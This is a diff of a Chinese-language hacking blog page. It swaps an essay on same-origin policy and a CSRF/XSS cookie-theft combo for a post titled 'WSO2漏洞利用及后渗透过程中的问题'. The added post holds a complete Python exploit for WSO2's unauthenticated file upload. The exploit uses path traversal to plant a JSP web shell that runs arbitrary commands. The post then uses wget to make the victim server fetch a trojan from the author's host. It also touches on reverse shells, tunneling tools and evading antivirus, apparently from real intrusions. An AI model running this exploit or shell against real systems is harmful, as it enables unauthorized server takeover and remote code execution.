@@ -16,22 +16,24 @@
   <meta name="description" content="">
   <meta name="author" content="z3rg">
   <meta name="keywords" content="">
-  <meta name="description" content="同源策略同源策略，网上大致都有介绍，它是浏览器非常重要且基本的一个安全策略。  我最早认识到它的时候是想把300多个网络摄像机集成到一个html页面中，将其返回的视频内容直接在页面内显示，但是最后是被同源策略拦截而失败了。 其中最关键的点是，浏览器过滤掉了来自与当前url不同源就是跨域请求所发回来的响应，但是我们发过去的请求缺是被服务器所接受到的，也就是说我们插入xss的时候以及某些恶意javas">
+  <meta name="description" content="WSO2漏洞利用把exp代码发上，wso2的未授权任意文件上传 值得一提的是我过去对文件上传这一类漏洞利用exp都没了解到requests库的files可以上传，但是这次发现了，这样exp编写就方便太多了。 12345678910111213141516171819202122232425262728293031import requests, urllib3, sysurllib3.disabl">
 <meta property="og:type" content="article">
-<meta property="og:title" content="同源策略和CSRF研究及其与xss的组合拳">
-<meta property="og:url" content="https://maybe279.github.io/posts/dwqakvweokncopi/index.html">
+<meta property="og:title" content="WSO2漏洞利用及后渗透过程中的问题">
+<meta property="og:url" content="https://maybe279.github.io/posts/wso22rejlafoipk/index.html">
 <meta property="og:site_name" content="HackLog">
-<meta property="og:description" content="同源策略同源策略，网上大致都有介绍，它是浏览器非常重要且基本的一个安全策略。  我最早认识到它的时候是想把300多个网络摄像机集成到一个html页面中，将其返回的视频内容直接在页面内显示，但是最后是被同源策略拦截而失败了。 其中最关键的点是，浏览器过滤掉了来自与当前url不同源就是跨域请求所发回来的响应，但是我们发过去的请求缺是被服务器所接受到的，也就是说我们插入xss的时候以及某些恶意javas">
+<meta property="og:description" content="WSO2漏洞利用把exp代码发上，wso2的未授权任意文件上传 值得一提的是我过去对文件上传这一类漏洞利用exp都没了解到requests库的files可以上传，但是这次发现了，这样exp编写就方便太多了。 12345678910111213141516171819202122232425262728293031import requests, urllib3, sysurllib3.disabl">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://maybe279.github.io/posts/dwqakvweokncopi/image-20220421225834330.png">
-<meta property="article:published_time" content="2022-04-21T12:59:18.968Z">
-<meta property="article:modified_time" content="2022-04-23T16:48:16.371Z">
+<meta property="og:image" content="https://maybe279.github.io/posts/wso22rejlafoipk/image-20220423235930990.png">
+<meta property="og:image" content="https://maybe279.github.io/posts/wso22rejlafoipk/image-20220424000107352.png">
+<meta property="article:published_time" content="2022-04-23T15:26:38.368Z">
+<meta property="article:modified_time" content="2022-04-23T16:38:05.506Z">
 <meta property="article:author" content="z3rg">
+<meta property="article:tag" content="实战">
 <meta property="article:tag" content="Hacking">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://maybe279.github.io/posts/dwqakvweokncopi/image-20220421225834330.png">
+<meta name="twitter:image" content="https://maybe279.github.io/posts/wso22rejlafoipk/image-20220423235930990.png">
   
-  <title>同源策略和CSRF研究及其与xss的组合拳 - HackLog</title>
+  <title>WSO2漏洞利用及后渗透过程中的问题 - HackLog</title>
 
   <link  rel="stylesheet" href="/css/bootstrap.min.css" />
 
@@ -178,7 +180,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.4)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="同源策略和CSRF研究及其与xss的组合拳">
+            <span class="h2" id="subtitle" title="WSO2漏洞利用及后渗透过程中的问题">
               
             </span>
 
@@ -193,8 +195,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2022-04-21 20:59" pubdate>
-        2022年4月21日 晚上
+      <time datetime="2022-04-23 23:26" pubdate>
+        2022年4月23日 晚上
       </time>
     </span>
   
@@ -204,7 +206,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.5k 字
+      2.6k 字
     </span>
   
 
@@ -213,7 +215,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      5 分钟
+      8 分钟
     </span>
   
 
@@ -250,21 +252,28 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">同源策略和CSRF研究及其与xss的组合拳</h1>
+            <h1 style="display: none">WSO2漏洞利用及后渗透过程中的问题</h1>
             
             <div class="markdown-body">
-              <h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略，网上大致都有介绍，它是浏览器非常重要且基本的一个安全策略。</p>
-<p><img src="/posts/dwqakvweokncopi/image-20220421225834330.png" srcset="/img/loading.gif" lazyload></p>
-<p>我最早认识到它的时候是想把300多个网络摄像机集成到一个html页面中，将其返回的视频内容直接在页面内显示，但是最后是被同源策略拦截而失败了。</p>
-<p>其中最关键的点是，浏览器过滤掉了来自与当前url不同源就是跨域请求所发回来的响应，但是我们发过去的请求缺是被服务器所接受到的，也就是说我们插入xss的时候以及某些恶意javascript代码往服务器发送窃取的消息是会被服务器所接受到的，只不过返回包会被拦截，而如果不想使返回包被拦截，可以使用跨域资源共享机制CORS。</p>
-<h2 id="CSRF-amp-XSS组合"><a href="#CSRF-amp-XSS组合" class="headerlink" title="CSRF&amp;XSS组合"></a>CSRF&amp;XSS组合</h2><p>众所周知csrf更多是拿去钓鱼进行一些什么转账啊改密啊等等，但是这种操作现在大都有多重验证机制，导致利用面狭窄，csrf也没有什么威慑力，不过我们可以尝试各种trick，将csrf与其他洞结合成combo来进行攻击。</p>
-<p>先声明此处的XSS组合拳非存储型xss，第一存储型xss利用效果与此重叠且危害可以更大，第二因为存储型xss很少且利用较难。</p>
-<p>我们使用的是一种将2个小漏洞组合成一种突破口的combo，也就是反射型xss配合csrf。</p>
-<p>如果一个站点同时存在反射xss与csrf，那我们构造一个包含payload的恶意请求放在我们的恶意网站中，可以是&lt;’img’&gt;来包含如果是post型我们可以使用Ajax或构造form并写上触发的js来发送对应的请求，其功能就是获取cookie并发送给我们的后端，再将其发送给该站点的客服或者管理员等拥有高后台权限的用户，如果他打开了，我们便能获取到cookie以进入后台进行更进一步的渗透。</p>
-<p>这种利用组合如果存在于大型平台，如果能配合其他存在同质化用户群体的大流量平台的存储型xss，可以将危害进一步拉到非常高的地步。</p>
-<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>最近搞了很多东西，也学到了不少，我今天研究了一下分布式系统，我认为如果要做一个分布式系统，那必须要让他有分布式运算，而不是说什么可以分布式交流就算分布式了，所以之前的zertoolkit-web压根不算分布式系统，我的思路是通过每台部署的轮子之间互相交换信息，然后统一收到一个任务之后同步至其他轮子，简单讲如果一个轮子受到任务，那么他会将任务以队列形式同时分发给其他轮子以同时进行，这样的话，部署的轮子越多，效率就越高。</p>
-<p>前阵子算是实际操作了下内网的东西，内网这一块我基本就没咋学过，没什么思路，找了老师傅帮忙看了看，大致学到了点基本功，比如win系统下查看任务进程pid，找rdp对应端口等等，ngork，frp，nps，lcx这些手段来出网等等。</p>
-<p>然后今天还打算实践一下之前一直没试的隐蔽招数，cdn配域名再绑ip，结果tmd，买这种不实名的域名外网基本都是绑信用卡，易贝卡现在停止个人用户了，我尝试tb搞了一个卡结果不行，gv号注册paypal美区又停止voip注册，服了，限制越来越多没办法，我研究了一下有些卖aws的注册卡可以尝试一下，aws也可以买这种域名，但是暂时是不想烦了，tb奸商今天还骗掉我50块，给的卡这个不行那个不行还不能退，恶心人真的。本来还想到绑ipv6的情况，现在实验中止，话说不知道以后ipv6的情况下渗透又会有什么挑战，至少按ipv6所言，很多设备应该都是直接一个公网ip了，很多内网也就不复存在了，但是那么多ip段，全网怎么整理出来，怎么测绘又是一个大麻烦，还有个人用户们如果都暴露在公网的话，那么又会有什么利用手段呢？这些都是未知数，我想到，一些中大型内网还是会以ipv4的形式存在，而小区域及散户未来会以ipv6形式部署。</p>
+              <h2 id="WSO2漏洞利用"><a href="#WSO2漏洞利用" class="headerlink" title="WSO2漏洞利用"></a>WSO2漏洞利用</h2><p>把exp代码发上，wso2的未授权任意文件上传</p>
+<p>值得一提的是我过去对文件上传这一类漏洞利用exp都没了解到requests库的files可以上传，但是这次发现了，这样exp编写就方便太多了。</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests, urllib3, sys<br>urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Usage: python3 <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">0</span>]&#125;</span> https://host shell.jsp&quot;</span>)<br>    exit()<br>    <br>host, file = sys.argv[<span class="hljs-number">1</span>:]<br>shell = <span class="hljs-string">&quot;&quot;&quot;&lt;FORM&gt;</span><br><span class="hljs-string">    &lt;INPUT name=&#x27;cmd&#x27; type=text&gt;</span><br><span class="hljs-string">    &lt;INPUT type=submit value=&#x27;Run&#x27;&gt;</span><br><span class="hljs-string">&lt;/FORM&gt;</span><br><span class="hljs-string">&lt;%@ page import=&quot;java.io.*&quot; %&gt;</span><br><span class="hljs-string">    &lt;%</span><br><span class="hljs-string">    String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="hljs-string">    String output = &quot;&quot;;</span><br><span class="hljs-string">    if(cmd != null) &#123;</span><br><span class="hljs-string">        String s = null;</span><br><span class="hljs-string">        try &#123;</span><br><span class="hljs-string">            Process p = Runtime.getRuntime().exec(cmd,null,null);</span><br><span class="hljs-string">            BufferedReader sI = new BufferedReader(new</span><br><span class="hljs-string">InputStreamReader(p.getInputStream()));</span><br><span class="hljs-string">            while((s = sI.readLine()) != null) &#123; output += s+&quot;&lt;/br&gt;&quot;; &#125;</span><br><span class="hljs-string">        &#125;  catch(IOException e) &#123;   e.printStackTrace();   &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">%&gt;</span><br><span class="hljs-string">        &lt;pre&gt;&lt;%=output %&gt;&lt;/pre&gt;&quot;&quot;&quot;</span><br>proxies = &#123;<span class="hljs-string">&quot;http&quot;</span>: <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>,<span class="hljs-string">&quot;https&quot;</span>: <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>&#125;<br>files = &#123;<span class="hljs-string">f&quot;../../../../repository/deployment/server/webapps/authenticationendpoint/<span class="hljs-subst">&#123;file&#125;</span>&quot;</span>: shell&#125;<br>response = requests.post(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;host&#125;</span>/fileupload/toolsAny&#x27;</span>, files=files, verify=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;shell @ <span class="hljs-subst">&#123;host&#125;</span>/authenticationendpoint/<span class="hljs-subst">&#123;file&#125;</span>&quot;</span>)<br></code></pre></div></td></tr></table></figure>
+
+<p>同时这里有个坑，那就是下面这几条，请求得把verify属性改为False同时关闭urllib3的不安全警报，如果不关会导致一些不安全的https请求访问不了，这样就会错失目标，实际上我第一轮结束才发现这个问题，还没有进行第二轮测试。</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib3<br>urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)<br>verify=<span class="hljs-literal">False</span><br></code></pre></div></td></tr></table></figure>
+
+<p>然后再说一下上传的shell的代码问题，实测直接替换成哥斯拉的马传不上去，我目测可能是长度超标，对方对上传的文件的大小做了限制，然后我看了下jsp文件上传的代码，长度比哥斯拉还长。。这就没办法了，我尝试用echo ‘xxx’ &gt;&gt; xx.jsp写入一个马进去，但是您猜怎么着，这该死的echo直接把我后面的命令全打印出来了，我尼玛文件是一个字都没写进去，我本来尝试改一下jsp的马让他直接echo，不过后来又想到一个办法，操作系统是linux，直接使用wget让对方服务器远程下载我服务器上准备的文件，于是愉快的进入最初步的后渗透。</p>
+<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><p>在服务器上传我们需要的木马，然后开个http服务器。</p>
+<p><img src="/posts/wso22rejlafoipk/image-20220423235930990.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/posts/wso22rejlafoipk/image-20220424000107352.png" srcset="/img/loading.gif" lazyload></p>
+<p>这样一来对方就能远程访问到我们的http服务器了</p>
+<p>接下来很简单，直接在shell运行命令即可</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">wget http://xxx.xxx.xxx.xxx:xxx/wso2.jsp -P xxx/xxx/<br></code></pre></div></td></tr></table></figure>
+
+<p>对方下载到准备好木马，然后直接连接再后续操作就不多啰嗦了。</p>
+<p>有一点就算在shell中上传大文件并不靠谱，最好的办法还是远程下载。</p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>这几天其实提醒了我一个非常重要的点，那就是一定要懂java，现在java的环境越来越多，如果不懂碰上java连上传个webshell都不知道怎么改，而且最近很多大型漏洞都是出自于java，很多框架和系统我听都没听说过，就比如这个wso2，如果没有爆出0day，我压根就没听说过这个系统，如果没人复现，我自己搭环境都是个大问题，java必须现在就得肝起来了，拖不得。</p>
+<p>然后又说起内网，我今天突然想到netcat，它可以用来反弹shell，在内网中似乎也有很大作用，不过我还在思考转发远程桌面的事情，我上次在一台winserver上吃了亏，试了各种方法就是转发不出来远程桌面，很气，难道说是杀软的缘故？不知道到底怎么样能把杀软干掉，或者彻底无视它们。内网也是我没有筑基的一片地方，主要还是集中在提权、免杀问题上，这个对老手来说应该问题不大，至于大型内网就根本没法涉及了，像是域渗透这些，对我来说一片空白，也没有机会涉及到这些，这年头突破外网已经成了最大的屏障，给我这种野生黑客撞到个大型内网实战简直是走狗屎运了，想练域渗透最直接的办法只有靠靶场。</p>
 
             </div>
             <hr>
@@ -274,6 +283,8 @@
                 
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%AE%9E%E6%88%98/">实战</a>
                     
                       <a class="hover-with-bg" href="/tags/Hacking/">Hacking</a>
                     
@@ -292,18 +303,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/posts/wso22rejlafoipk/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">WSO2漏洞利用及后渗透过程中的问题</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/posts/16pigeon/">
-                        <span class="hidden-mobile">年度总结&开发全览</span>
+                      <a href="/posts/dwqakvweokncopi/">
+                        <span class="hidden-mobile">同源策略和CSRF研究及其与xss的组合拳</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
